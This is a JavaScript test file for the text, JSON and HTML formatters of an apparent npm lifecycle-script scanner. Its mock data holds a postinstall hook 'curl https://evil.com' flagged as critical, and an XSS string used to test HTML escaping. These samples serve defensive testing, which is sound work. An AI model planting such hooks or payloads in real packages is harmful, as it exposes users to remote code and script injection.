const { getFormatter } = require("../../src/formatters");

let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    console.log(`  ✓ ${name}`);
    passed++;
  } catch (e) {
    console.log(`  ✗ ${name}: ${e.message}`);
    failed++;
  }
}

function assert(condition, msg) {
  if (!condition) throw new Error(msg || "Assertion failed");
}

console.log("\n  Formatter Tests\n");

const mockResult = {
  name: "test-pkg",
  version: "1.0.0",
  scripts: { postinstall: "curl https://evil.com" },
  findings: [
    {
      hook: "postinstall",
      command: "curl https://evil.com",
      isSafe: false,
      matches: [
        { ruleGroup: "network-access", id: "curl", severity: "critical", title: "curl", description: "Scarica dati" },
      ],
      hasSuspicious: true,
    },
  ],
  risk: { score: 15, level: "ALTO", color: "red" },
  hasLifecycleScripts: true,
};

const safeResult = {
  name: "safe-pkg",
  version: "2.0.0",
  scripts: {},
  findings: [],
  risk: { score: 0, level: "SICURO", color: "green" },
  hasLifecycleScripts: false,
};

// ─── Text formatter ───

test("text: genera output stringa non vuota", () => {
  const f = getFormatter("text");
  const output = f.format([mockResult, safeResult]);
  assert(typeof output === "string");
  assert(output.length > 0);
});

test("text: contiene il nome del pacchetto", () => {
  const f = getFormatter("text");
  const output = f.format([mockResult]);
  assert(output.includes("test-pkg"));
});

// ─── JSON formatter ───

test("json: genera JSON valido", () => {
  const f = getFormatter("json");
  const output = f.format([mockResult, safeResult]);
  const parsed = JSON.parse(output);
  assert(parsed.summary.total === 2);
  assert(parsed.summary.suspicious === 1);
  assert(parsed.summary.safe === 1);
});

test("json: include timestamp", () => {
  const f = getFormatter("json");
  const parsed = JSON.parse(f.format([safeResult]));
  assert(parsed.timestamp !== undefined);
});

test("json: compact mode funziona", () => {
  const f = getFormatter("json");
  const compact = f.format([safeResult], { compact: true });
  assert(!compact.includes("\n"));
});

// ─── HTML formatter ───

test("html: genera HTML valido con DOCTYPE", () => {
  const f = getFormatter("html");
  const output = f.format([mockResult, safeResult]);
  assert(output.startsWith("<!DOCTYPE html>"));
  assert(output.includes("</html>"));
});

test("html: contiene il nome del pacchetto", () => {
  const f = getFormatter("html");
  const output = f.format([mockResult]);
  assert(output.includes("test-pkg"));
});

test("html: escapa caratteri HTML", () => {
  const f = getFormatter("html");
  const evilResult = {
    ...mockResult,
    name: "<script>alert(1)</script>",
  };
  const output = f.format([evilResult]);
  assert(!output.includes("<script>alert"));
  assert(output.includes("&lt;script&gt;"));
});

// ─── Formatter non esistente ───

test("getFormatter lancia errore per formatter sconosciuto", () => {
  let threw = false;
  try {
    getFormatter("non-esiste");
  } catch {
    threw = true;
  }
  assert(threw, "Dovrebbe lanciare un errore");
});

// ─── Custom formatter ───

test("getFormatter accetta formatter custom", () => {
  const custom = { format: (r) => `custom:${r.length}` };
  const f = getFormatter("mio", { mio: custom });
  assert(f.format([safeResult]) === "custom:1");
});

console.log(`\n  Risultati: ${passed} passati, ${failed} falliti\n`);
process.exit(failed > 0 ? 1 : 0);
